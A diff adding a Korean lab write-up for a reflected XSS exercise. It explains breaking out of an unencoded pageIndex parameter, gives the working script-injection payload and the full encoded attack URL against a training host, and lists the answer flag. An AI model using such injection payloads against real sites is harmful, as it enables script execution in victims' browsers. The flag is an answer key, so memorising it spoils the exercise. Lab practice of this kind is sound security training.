@@ -1,0 +1,21 @@
+========================
+XSS 1번 — Reflected XSS
+========================
+
+1. 공격 과정
+- pageIndex 파라미터에서 HTML 인코딩 미적용 확인
+- 1"/>로 기존 태그 종료
+- <script>로 JavaScript 실행
+- <qq qq="로 남는 HTML 문법 처리
+- 페이지 번호를 `1`로 변경하여 화면 표시 정상화
+
+2. 공격 구문
+1"/><script>document.querySelector('.current_page strong').textContent='1';alert('XSS');</script><qq qq="
+
+3. 공격 실행 주소
+https://lab.eqst.co.kr:8083/exam16/noticelist.php?pageIndex=1%22%2F%3E%3Cscript%3Edocument.querySelector%28%27.current_page%20strong%27%29.textContent%3D%271%27%3Balert%28%27XSS%27%29%3B%3C%2Fscript%3E%3Cqq%20qq%3D%22&sorting=BOARD_ID&sortingAd=DESC&startDt=&endDt=&searchType=all&keyword=
+
+4. 정답
+skinfosec
+
+========================
